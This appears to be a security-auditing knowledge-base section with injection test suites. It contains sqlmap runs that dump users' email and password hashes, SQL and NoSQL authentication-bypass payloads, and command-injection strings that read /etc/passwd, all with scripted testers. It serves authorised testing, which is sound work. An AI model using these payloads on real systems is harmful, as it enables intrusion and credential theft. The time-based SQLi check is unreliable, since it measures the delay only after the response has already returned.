# Security KB 02 — Injection Test Suites: SQLi, NoSQLi, Command Injection, SSTI-adjacent

Source: extracted from the former `core-04-security-auditor.md` monolith (lines 477-786, 1830-1965). Full SQL injection (automated + manual + scripted), NoSQL injection (MongoDB operator), and command injection test suites.

---

## SQL INJECTION TESTING

### Test 1: Automated SQL Injection Detection with sqlmap

**Source:** Research-added (OWASP Testing Guide + sqlmap documentation)

**Description:** Automated SQL injection testing using sqlmap for comprehensive vulnerability detection.

**Implementation:**

```bash
# Basic sqlmap scan
sqlmap -u "https://api.example.com/users?id=1" \
  --batch \
  --level=5 \
  --risk=3 \
  --random-agent

# Test with authentication
sqlmap -u "https://api.example.com/profile" \
  --cookie="session=abc123xyz" \
  --batch \
  --dbs

# Test POST requests
sqlmap -u "https://api.example.com/search" \
  --data="query=test&category=all" \
  --method=POST \
  --batch

# Test with custom headers (JWT)
sqlmap -u "https://api.example.com/api/users" \
  --header="Authorization: Bearer eyJhbGc..." \
  --batch \
  --dump

# Advanced: Test all parameters
sqlmap -u "https://api.example.com/product?id=1&cat=electronics&sort=price" \
  --batch \
  --level=5 \
  --risk=3 \
  --threads=10 \
  --tamper=space2comment \
  --technique=BEUSTQ

# Database enumeration
sqlmap -u "https://api.example.com/users?id=1" \
  --batch \
  --dbs  # List databases

sqlmap -u "https://api.example.com/users?id=1" \
  --batch \
  -D database_name \
  --tables  # List tables

sqlmap -u "https://api.example.com/users?id=1" \
  --batch \
  -D database_name \
  -T users \
  --columns  # List columns

sqlmap -u "https://api.example.com/users?id=1" \
  --batch \
  -D database_name \
  -T users \
  -C email,password_hash \
  --dump  # Extract data
```

### Test 2: Manual SQL Injection Testing

**Source:** Extracted from Backend Specialist (SQL Injection Prevention patterns)

**Description:** Manual SQL injection testing with common payloads.

**Test Payloads:**

#### Test Case 2.1: Classic SQL Injection

```bash
# Test for basic SQL injection
# Payload 1: Single quote (error-based)
curl -X GET "https://api.example.com/users?id=1'"

# Expected Safe Response: 400 Bad Request (input validation)
# Vulnerable Response: 500 Internal Server Error with SQL error message

# Payload 2: OR 1=1 (boolean-based)
curl -X GET "https://api.example.com/users?id=1 OR 1=1--"

# Expected Safe Response: 400 Bad Request or returns single user
# Vulnerable Response: Returns ALL users

# Payload 3: UNION-based
curl -X GET "https://api.example.com/users?id=1 UNION SELECT NULL,NULL,NULL--"

# Payload 4: Time-based blind
curl -X GET "https://api.example.com/users?id=1; WAITFOR DELAY '00:00:05'--"

# Expected: Immediate response
# Vulnerable: 5 second delay
```

#### Test Case 2.2: POST Body SQL Injection

```bash
# Test JSON body injection
curl -X POST "https://api.example.com/search" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "test\" OR \"1\"=\"1",
    "category": "products"
  }'

# Test form data injection
curl -X POST "https://api.example.com/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=admin@example.com' OR '1'='1'--&password=anything"
```

**Automated Test Script:**

```python
# sql_injection_test.py
import requests
import time

class SQLInjectionTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.payloads = {
            "error_based": [
                "'",
                "\"",
                "' OR '1'='1",
                "\" OR \"1\"=\"1",
                "' OR '1'='1'--",
                "' OR '1'='1' /*"
            ],
            "union_based": [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT username,password FROM users--"
            ],
            "boolean_based": [
                "' AND '1'='1",
                "' AND '1'='2",
                "' OR '1'='1",
                "' OR '1'='2"
            ],
            "time_based": [
                "'; WAITFOR DELAY '00:00:05'--",
                "' OR SLEEP(5)--",
                "' OR pg_sleep(5)--"
            ]
        }

    def test_endpoint(self, endpoint, param, method="GET"):
        """Test endpoint for SQL injection"""
        results = []

        for payload_type, payloads in self.payloads.items():
            for payload in payloads:
                if method == "GET":
                    url = f"{self.base_url}{endpoint}?{param}={payload}"
                    response = requests.get(url)
                else:
                    response = requests.post(
                        f"{self.base_url}{endpoint}",
                        json={param: payload}
                    )

                # Analyze response
                vulnerability = self.analyze_response(
                    response,
                    payload,
                    payload_type
                )

                if vulnerability:
                    results.append(vulnerability)

        return results

    def analyze_response(self, response, payload, payload_type):
        """Analyze response for SQL injection indicators"""

        # Check for SQL error messages
        sql_errors = [
            "SQL syntax",
            "mysql_fetch",
            "pg_query",
            "ORA-",
            "ODBC",
            "SQLite",
            "Unclosed quotation mark"
        ]

        for error in sql_errors:
            if error.lower() in response.text.lower():
                return {
                    "vulnerability": "SQL Injection - Error-Based",
                    "payload": payload,
                    "type": payload_type,
                    "severity": "CRITICAL",
                    "cvss": 9.8,
                    "evidence": f"SQL error message found: {error}",
                    "recommendation": "Use parameterized queries/prepared statements"
                }

        # Check for time-based blind SQLi
        if payload_type == "time_based":
            start = time.time()
            # Response already received
            duration = time.time() - start

            if duration >= 5:
                return {
                    "vulnerability": "SQL Injection - Time-Based Blind",
                    "payload": payload,
                    "type": payload_type,
                    "severity": "CRITICAL",
                    "cvss": 9.8,
                    "evidence": f"Response delayed by {duration:.2f} seconds",
                    "recommendation": "Use parameterized queries"
                }

        # Check for boolean-based (check response differences)
        if payload_type == "boolean_based":
            # Would need to compare true/false responses
            pass

        return None

# Usage
tester = SQLInjectionTester("https://api.example.com")

# Test specific endpoint
results = tester.test_endpoint("/users", "id", method="GET")

# Generate report
for vuln in results:
    print(f"""
VULNERABILITY FOUND:
  Type: {vuln['vulnerability']}
  Severity: {vuln['severity']}
  CVSS: {vuln['cvss']}
  Payload: {vuln['payload']}
  Evidence: {vuln['evidence']}
  Recommendation: {vuln['recommendation']}
""")
```

### Test 3: NoSQL Injection Testing (MongoDB)

**Source:** Research-added

```javascript
// NoSQL injection test payloads
const noSqlPayloads = [
  // JSON injection
  { "email": {"$ne": null} },
  { "email": {"$regex": ".*"} },

  // Boolean bypass
  { "email": "admin@example.com", "password": {"$ne": ""} },

  // JavaScript injection
  { "email": "admin@example.com", "password": {"$where": "this.password == 'anything' || '1'=='1'"} },

  // Operator injection
  { "$where": "1==1" },
  { "email": {"$gt": ""} }
];

async function testNoSQLInjection(apiUrl) {
  for (const payload of noSqlPayloads) {
    const response = await fetch(`${apiUrl}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (response.status === 200) {
      const data = await response.json();
      if (data.token || data.user) {
        console.log(`CRITICAL NoSQL Injection: ${JSON.stringify(payload)}`);
        return {
          vulnerability: "NoSQL Injection",
          severity: "CRITICAL",
          cvss: 9.8,
          payload: payload
        };
      }
    }
  }
}
```

**Best Practices:**
- DO: Test all input parameters (GET, POST, headers, cookies)
- DO: Use both automated (sqlmap) and manual testing
- DO: Test with authentication tokens
- DO: Check for error messages revealing DB type
- DO: Test time-based blind injection
- DO: Test NoSQL databases separately (MongoDB, DynamoDB)
- DON'T: Stop at first injection point - enumerate all
- DON'T: Extract production data - stop at proof-of-concept

---

## NoSQL INJECTION TESTING (detailed)

### Source: Research-added (MongoDB, Redis)

**Test Case 1: MongoDB Operator Injection**

```javascript
// MongoDB $ne (not equal) bypass
POST /api/login HTTP/1.1
Content-Type: application/json

{
  "email": { "$ne": null },
  "password": { "$ne": null }
}
// If vulnerable: Returns first user in database

// $gt (greater than) bypass
{
  "email": "admin@example.com",
  "password": { "$gt": "" }
}
// If vulnerable: Bypasses password check

// $regex injection
{
  "email": { "$regex": ".*admin.*" },
  "password": { "$ne": null }
}
// If vulnerable: Finds admin users
```

**Test Case 2: Automated NoSQL Injection**

```python
# nosql_injection_test.py
import requests
import json

def test_nosql_injection(url):
    """Test for MongoDB operator injection"""

    payloads = [
        # Authentication bypass
        {"email": {"$ne": None}, "password": {"$ne": None}},
        {"email": {"$gt": ""}, "password": {"$gt": ""}},
        {"email": {"$regex": ".*"}, "password": {"$ne": None}},

        # $where injection (dangerous)
        {"$where": "1==1"},
        {"email": {"$where": "this.password.length > 0"}},

        # Array injection
        {"email[]": "admin@example.com", "password[]": {"$ne": ""}},
    ]

    vulnerabilities = []

    for payload in payloads:
        response = requests.post(url, json=payload)

        if response.status_code == 200:
            try:
                data = response.json()
                if 'token' in data or 'user' in data:
                    vulnerabilities.append({
                        "payload": json.dumps(payload),
                        "severity": "CRITICAL",
                        "cvss": 9.8
                    })
            except:
                pass

    return vulnerabilities if vulnerabilities else {"status": "PASS"}
```

---

## COMMAND INJECTION TESTING

### Source: Research-added (OWASP)

**Test Case 1: Basic Command Injection**

```bash
# Test command chaining
curl "https://api.example.com/ping?host=8.8.8.8;id"
curl "https://api.example.com/ping?host=8.8.8.8|id"
curl "https://api.example.com/ping?host=8.8.8.8\`id\`"
curl "https://api.example.com/ping?host=\$(id)"

# Test command with output capture
curl "https://api.example.com/ping?host=8.8.8.8;cat /etc/passwd"
curl "https://api.example.com/ping?host=8.8.8.8|cat /etc/passwd"
```

**Test Case 2: Blind Command Injection**

```python
# blind_command_injection.py
import requests
import time

def test_blind_command_injection(url, param):
    """Test for blind command injection using time delays"""

    # Time-based payloads
    payloads = [
        "; sleep 5",
        "| sleep 5",
        "& sleep 5",
        "`sleep 5`",
        "$(sleep 5)",
        "%0asleep 5",
        "\nsleep 5"
    ]

    for payload in payloads:
        start_time = time.time()

        response = requests.get(f"{url}?{param}=test{payload}")

        elapsed = time.time() - start_time

        if elapsed >= 5:
            return {
                "vulnerability": "Blind Command Injection",
                "payload": payload,
                "severity": "CRITICAL",
                "cvss": 10.0,
                "recommendation": "Never use shell commands with user input. Use libraries instead."
            }

    return {"status": "PASS"}
```
